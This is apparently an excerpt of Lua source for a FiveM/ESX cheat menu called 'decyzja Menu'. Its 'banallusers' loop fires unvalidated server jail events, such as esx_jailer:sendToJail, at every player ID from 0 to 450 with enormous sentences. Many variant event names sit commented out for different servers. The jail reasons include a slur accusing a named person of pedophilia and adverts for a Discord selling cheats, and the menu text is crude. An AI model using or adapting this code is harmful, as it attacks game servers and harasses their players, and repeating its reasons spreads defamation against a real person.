...
Citizen.CreateThread(
	function()
		while Enabled do
			...
			if banallusers then
				for i = 0, 450 do
			    --TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 9999 * 60, "FAJNY TEN ANTY LYNX", 9999999999)
			    TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 123123 * 60, "DAWID JASPER NIE MA JEDYNEK PEDOFIl", 1)
				--TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 5555 * 60, "https://discord.gg/BdujFR << kupno czitow :D", 112)
				--TriggerServerEvent("esx_wiezienie:wyslijwiezienie", GetPlayerServerId(i), 5555 * 60, "https://discord.gg/BdujFR << kupno czitow :D", 997)
				--TriggerServerEvent("xDDDDDD ur mother gay", GetPlayerServerId(i), 5555, "https://discord.gg/BdujFR << kupno czitow :D")
				--TriggerServerEvent("esx_jailer:sendToJail2", GetPlayerServerId(i), 997 * 60, "", 999999)
				--TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 99999999, "https://discord.gg/BdujFR << kupno czitow :D")
				--TriggerServerEvent("wyspa_jail:SendMessagelynxtogowno", GetPlayerServerId(i), 997, "https://discord.gg/BdujFR << kupno czitow :D")
				--TriggerServerEvent("wyspa_jail:addKartoteka", GetPlayerServerId(i), 9999999, "https://discord.gg/BdujFR << kupno czitow :D", 997)
				--TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9999999 * 60)
				--TriggerServerEvent("esx_jailers:sendToJail", GetPlayerServerId(i), 999999 * 60, "https://discord.gg/BdujFR << kupno czitow :D", 999999999)
				--TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
				--TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "https://discord.gg/BdujFR << kupno czitow :D", 300)
				--TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "https://discord.gg/BdujFR << kupno czitow :D")
				--TriggerServerEvent("esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "https://discord.gg/BdujFR << kupno czitow :D")
				--TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 50000)
				--TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 5000, "https://discord.gg/BdujFR << kupno czitow :D")
...
Citizen.CreateThread(
	function()
		...
		ariesMenu.CreateMenu("MainMenu", "decyzja ~n~~r~on yt")
		ariesMenu.SetSubTitle("MainMenu", "My channel decyzja")
		...
		while Enabled do
			if ariesMenu.IsMenuOpened("MainMenu") then
			    drawNotification("~g~Working... ~n~~r~decyzja Menu ~s~V 1.0")
				drawNotification("~g~legit dick: ~s~~n~16cm ~n~~r~decyzja")
